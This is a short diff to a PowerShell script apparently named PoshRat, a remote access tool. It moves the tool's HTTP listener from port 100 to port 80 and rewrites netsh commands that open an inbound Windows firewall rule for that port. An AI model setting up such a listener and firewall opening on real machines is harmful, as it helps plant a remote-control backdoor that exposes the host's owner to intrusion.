@@ -37,10 +37,10 @@ function Receive-Request
 }
 
 $listener = New-Object System.Net.HttpListener
-$listener.Prefixes.Add('http://+:100/') 
+$listener.Prefixes.Add('http://+:80/') 
 
-netsh advfirewall firewall delete rule name="PoshRat 100" | Out-Null
-netsh advfirewall firewall add rule name="PoshRat 100" dir=in action=allow protocol=TCP localport=100 | Out-Null
+netsh advfirewall firewall delete rule name="PoshRat 80" | Out-Null
+netsh advfirewall firewall add rule name="PoshRat 80" dir=in action=allow protocol=TCP localport=80 | Out-Null
 
 $listener.Start()
 'Listening ...'
